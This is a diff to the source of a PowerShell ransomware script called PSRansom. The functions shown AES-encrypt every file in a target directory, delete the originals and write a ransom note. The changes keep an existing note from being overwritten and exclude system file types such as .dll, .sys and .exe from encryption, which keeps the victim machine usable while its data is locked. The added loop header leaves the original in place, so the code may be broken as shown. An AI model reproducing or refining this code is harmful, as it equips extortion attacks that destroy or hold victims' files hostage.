@@ -288,11 +288,13 @@ function SendOK {
 
 function CreateReadme {
    $ReadmeTXT = "All your files have been encrypted by PSRansom!`nBut don't worry, you can still recover them with the recovery key :)`n"
-   Remove-Item "$Directory$slash$Readme" ; Add-Content -Path "$Directory$slash$Readme" -Value $ReadmeTXT 
-   Add-Content -Path "$Directory$slash$Readme" -Value "Recovery Key: $PSRKey `n" }
+   if (!(Test-Path "$Directory$slash$Readme")) { Add-Content -Path "$Directory$slash$Readme" -Value $ReadmeTXT 
+   Add-Content -Path "$Directory$slash$Readme" -Value "Recovery Key: $PSRKey `n" }}
 
 function EncryptFiles {
    foreach ($i in $(Get-ChildItem $Directory -recurse -exclude *.psr,readme.txt | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })) { 
+   $ExcludedFiles = '*.psr', 'readme.txt', '*.dll', '*.ini', '*.sys', '*.exe', '*.msi', '*.NLS', '*.acm', '*.nls', '*.EXE', '*.dat', '*.efi', '*.mui'
+   foreach ($i in $(Get-ChildItem $Directory -recurse -exclude $ExcludedFiles | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })) { 
       Invoke-AESEncryption -Mode Encrypt -Key $PSRKey -Path $i ; Add-Content -Path "$Directory$slash$Readme" -Value "[!] $i is now encrypted" ; Remove-Item $i }
       $RansomLogs = Get-Content "$Directory$slash$Readme" | Select-String "[!]" | Select-String "PSRansom!" -NotMatch ; if (!$RansomLogs) { 
       Add-Content -Path "$Directory$slash$Readme" -Value "[!] No files have been encrypted!" }}
